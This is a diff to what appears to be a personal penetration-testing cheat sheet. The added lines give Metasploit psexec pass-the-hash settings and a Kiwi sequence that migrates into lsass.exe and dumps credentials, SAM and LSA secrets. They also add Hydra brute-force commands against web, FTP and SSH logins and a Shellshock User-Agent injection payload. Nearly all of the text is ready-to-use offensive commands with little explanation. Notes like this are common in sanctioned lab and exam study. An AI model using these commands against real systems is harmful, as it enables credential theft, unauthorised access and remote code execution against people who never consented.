@@ -33,6 +33,7 @@ wimrm_script // MSF  set FORCE_VBS true
 SMB -
 psexec.py user@ip cmd.exe // psawns cmd shell
 exploit/windows/psexec //MSF 
+/smb/psexec  // set LPORT to new port // set SMBPASS hash lm:ntlm
 
 
 MSF -
@@ -46,11 +47,32 @@ SIGN_INS -
 mysql -u username -p
 smbclient //192.168.1.1/sharename -U username
 sudo mount.cifs //192.168.1.1/sharename /mnt/localfolder -o username=user,password=pass
-xfreerdp /u:user /p:pass /V:ip:port
+xfreerdp /u:user /p:pass /v:ip:port
 
 WINDOWS ESC -
 C:\Panther\unattended.xml
 getsystem //MSF
 suggester //MSF 
 suggester
+
+KIWI -
+get meterpreter session
+migrate -N lsass.exe
+load kiwi
+creds_all
+lsa_dump_sam
+lsa_dump_secrets
+
+HYDRA -
+hydra -l admin -P /path/to/wordlist.txt http-get://<target_IP>/admin
+hydra -l user -P pass.txt ip ftp
+hydra -l user -p pass ip ssh
+
+SHELLSHOCK - 
+look for cgi, find directory and inject into user-agent
+() { :; }; echo; echo; /bin/bash -c 'script'
+
+
+
+
 
